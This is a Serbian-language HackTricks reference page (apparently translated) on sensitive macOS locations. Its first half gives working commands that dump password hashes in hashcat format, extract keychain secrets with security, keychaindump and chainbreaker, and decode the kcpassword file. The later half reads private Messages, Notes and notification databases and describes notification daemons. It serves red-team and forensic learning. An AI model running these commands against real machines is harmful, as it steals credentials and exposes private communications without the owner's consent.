# macOS Osetljive lokacije i interesantni demoni

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Lozinke

### Senke lozinki

Senka lozinke se čuva sa korisničkom konfiguracijom u plistovima smeštenim u **`/var/db/dslocal/nodes/Default/users/`**.\
Sledeći oneliner može se koristiti za ispis **svih informacija o korisnicima** (uključujući informacije o hešu):

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Skripte poput ove**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ili [**ove**](https://github.com/octomagon/davegrohl.git) mogu se koristiti za transformisanje heša u **hashcat** **format**.

Alternativni jednolinijski kod koji će izbaciti podatke za prijavljivanje svih korisničkih naloga koji nisu servisni nalozi u hashcat formatu `-m 7100` (macOS PBKDF2-SHA512):

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
### Dumpovanje keša

Imajte na umu da prilikom korišćenja binarnog koda security za **dumpovanje dešifrovanih lozinki**, korisniku će biti postavljeno nekoliko prozora za odobrenje ove operacije.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Na osnovu ovog komentara [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) izgleda da ovi alati više ne funkcionišu u Big Sur-u.
{% endhint %}

### Pregled Keychaindump-a

Alat pod nazivom **keychaindump** je razvijen za izvlačenje lozinki iz macOS keychain-ova, ali se suočava sa ograničenjima na novijim macOS verzijama poput Big Sura, kako je naznačeno u [diskusiji](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Korišćenje **keychaindump**-a zahteva od napadača da stekne pristup i eskalira privilegije na **root** nivo. Alat iskorišćava činjenicu da je keychain podrazumevano otključan prilikom korisnikovog prijavljivanja radi praktičnosti, omogućavajući aplikacijama pristup bez ponovnog unošenja korisnikove lozinke. Međutim, ako korisnik odluči da zaključa svoj keychain nakon svake upotrebe, **keychaindump** postaje neefikasan.

**Keychaindump** funkcioniše tako što cilja određeni proces nazvan **securityd**, opisan od strane Apple-a kao daemon za autorizaciju i kriptografske operacije, od suštinskog značaja za pristup keychain-u. Proces ekstrakcije uključuje identifikaciju **Master Key**-a izvedenog iz korisnikove prijavne lozinke. Ovaj ključ je neophodan za čitanje keychain fajla. Da bi pronašao **Master Key**, **keychaindump** skenira memorijski heap **securityd**-a koristeći `vmmap` komandu, tražeći potencijalne ključeve unutar područja označenih kao `MALLOC_TINY`. Sledeća komanda se koristi za inspekciju ovih memorijskih lokacija:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Nakon identifikacije potencijalnih glavnih ključeva, **keychaindump** pretražuje hrpe za određeni obrazac (`0x0000000000000018`) koji ukazuje na kandidata za glavni ključ. Dalji koraci, uključujući deobfuskaciju, potrebni su za korišćenje ovog ključa, kako je navedeno u izvornom kodu **keychaindump**-a. Analitičari koji se fokusiraju na ovu oblast trebalo bi da primete da su ključni podaci za dešifrovanje keš memorije sačuvani unutar memorije procesa **securityd**. Primer komande za pokretanje **keychaindump**-a je:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) može se koristiti za izvlačenje sledećih vrsta informacija iz OSX keychain-a na forenzički ispravan način:

* Hashovana Keychain lozinka, pogodna za pucanje pomoću [hashcat](https://hashcat.net/hashcat/) ili [John the Ripper](https://www.openwall.com/john/)
* Internet lozinke
* Generičke lozinke
* Privatni ključevi
* Javni ključevi
* X509 sertifikati
* Bezbedne beleške
* Appleshare lozinke

Uz ključ za otključavanje keychain-a, master ključ dobijen korišćenjem [volafox](https://github.com/n0fate/volafox) ili [volatility](https://github.com/volatilityfoundation/volatility), ili fajl za otključavanje poput SystemKey, Chainbreaker će takođe pružiti lozinke u obliku običnog teksta.

Bez jednog od ovih metoda za otključavanje Keychain-a, Chainbreaker će prikazati sve ostale dostupne informacije.

#### **Izbaci ključeve keychain-a**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Izbacite ključeve lanca ključeva (sa lozinkama) pomoću SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Izbacivanje ključeva lanca ključeva (sa lozinkama) i dešifrovanje heša**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Izbacite ključeve lanca ključeva (sa lozinkama) pomoću ispusta memorije**

[Pratite ove korake](../#dumping-memory-with-osxpmem) da biste izvršili **ispust memorije**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Izbacite ključeve lanca ključeva (sa lozinkama) koristeći korisnikovu lozinku**

Ako znate korisnikovu lozinku, možete je koristiti da **izbacite i dešifrujete lance ključeva koji pripadaju korisniku**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

**kcpassword** fajl je fajl koji čuva **korisničku lozinku za prijavljivanje**, ali samo ako vlasnik sistema ima **omogućeno automatsko prijavljivanje**. Stoga će korisnik automatski biti prijavljen bez traženja lozinke (što nije vrlo sigurno).

Lozinka je sačuvana u fajlu **`/etc/kcpassword`** ksovirovana ključem **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Ako je korisnička lozinka duža od ključa, ključ će biti ponovo korišćen.\
Ovo čini lozinku prilično lako povratiti, na primer korišćenjem skripti poput [**ove**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interesantne Informacije u Bazama Podataka

### Poruke
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Obaveštenja

Podatke o obaveštenjima možete pronaći u `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Većina zanimljivih informacija će biti u **blob**-u. Stoga ćete morati da **izvučete** taj sadržaj i **transformišete** ga u **čitljiv** oblik ili koristite **`strings`**. Da pristupite tome možete uraditi: 

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
{% endcode %}

### Beleške

Korisničke **beleške** se mogu pronaći u `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

## Postavke

U macOS aplikacijama postavke se nalaze u **`$HOME/Library/Preferences`**, a u iOS-u se nalaze u `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

U macOS-u se alatka komandne linije **`defaults`** može koristiti za **izmenu datoteke postavki**.

**`/usr/sbin/cfprefsd`** zahteva XPC servise `com.apple.cfprefsd.daemon` i `com.apple.cfprefsd.agent` i može se pozvati da obavlja radnje poput izmene postavki.

## Sistem Obaveštenja

### Darwin Obaveštenja

Glavni demon za obaveštenja je **`/usr/sbin/notifyd`**. Da bi primili obaveštenja, klijenti se moraju registrovati preko Mach porta `com.apple.system.notification_center` (proverite ih sa `sudo lsmp -p <pid notifyd>`). Demon je konfigurabilan putem datoteke `/etc/notify.conf`.

Imena korišćena za obaveštenja su jedinstvene notacije obrnute DNS i kada se obaveštenje pošalje jednoj od njih, klijenti koji su naznačili da mogu da ga obrade će ga primiti.

Moguće je ispisati trenutni status (i videti sva imena) slanjem signala SIGUSR2 procesu notifyd i čitanjem generisane datoteke: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distribuirani centar za obaveštenja

**Distribuirani centar za obaveštenja** čiji je glavni binarni fajl **`/usr/sbin/distnoted`**, je još jedan način slanja obaveštenja. Izlaže neke XPC servise i vrši provere kako bi pokušao da verifikuje klijente.

### Apple Push obaveštenja (APN)

U ovom slučaju, aplikacije mogu da se registruju za **teme**. Klijent će generisati token kontaktirajući servere kompanije Apple putem **`apsd`**.\
Zatim, pružaoci usluga će takođe generisati token i biće u mogućnosti da se povežu sa serverima kompanije Apple kako bi poslali poruke klijentima. Ove poruke će lokalno biti primljene od strane **`apsd`** koji će proslediti obaveštenje aplikaciji koja ga očekuje.

Postavke se nalaze u `/Library/Preferences/com.apple.apsd.plist`.

Postoji lokalna baza podataka poruka smeštena u macOS-u u `/Library/Application\ Support/ApplePushService/aps.db` i u iOS-u u `/var/mobile/Library/ApplePushService`. Sadrži 3 tabele: `incoming_messages`, `outgoing_messages` i `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Takođe je moguće dobiti informacije o daemonu i konekcijama koristeći:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Obaveštenja korisnika

Ovo su obaveštenja koja korisnik treba da vidi na ekranu:

- **`CFUserNotification`**: Ova API pruža način da se prikaže iskačući prozor sa porukom na ekranu.
- **Tabla sa obaveštenjima**: Ovo prikazuje baner na iOS-u koji nestaje i biće sačuvan u Centru za obaveštenja.
- **`NSUserNotificationCenter`**: Ovo je tabla sa obaveštenjima na MacOS-u. Baza podataka sa obaveštenjima se nalazi u `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`
